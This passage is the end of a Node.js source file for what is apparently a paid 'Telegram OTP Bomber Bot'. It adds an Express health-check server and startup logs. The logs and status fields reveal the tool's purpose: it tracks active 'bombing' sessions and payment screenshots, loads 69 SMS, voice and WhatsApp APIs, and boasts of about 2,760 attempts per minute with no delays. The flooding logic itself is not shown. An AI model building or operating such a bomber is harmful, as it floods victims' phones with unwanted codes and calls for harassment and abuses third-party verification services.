        return;
    }
});

// ============================================================
// ===== HEALTH CHECK SERVER =====
// ============================================================

const express = require('express');
const app = express();
const port = process.env.PORT || 10000;

app.get('/health', (req, res) => {
    const mem = process.memoryUsage();
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        memory: {
            heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(2) + 'MB',
            heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(2) + 'MB',
            rss: (mem.rss / 1024 / 1024).toFixed(2) + 'MB'
        },
        activeBombing: bombingStatus.size,
        totalAPIs: allApis.length,
        qrCodeSet: qrCodeSet,
        pendingPayments: pendingScreenshots.size
    });
});

app.get('/', (req, res) => {
    res.send('🤖 Telegram OTP Bomber Bot is running!\n\n📊 Health: /health');
});

app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Health check server on port ${port}`);
});

console.log('🤖 Bot started successfully!');
console.log(`🚀 Loaded ${allApis.length} APIs (SMS: ${SMS_APIS.length}, Voice: ${VOICE_APIS.length}, WhatsApp: ${WHATSAPP_APIS.length})`);
console.log(`⚡ Speed Mode: ALL APIs in SINGLE batch, NO delays, NO retries`);
console.log(`📊 Estimated: 69 APIs × 40 cycles/min = ~2760 attempts/min`);
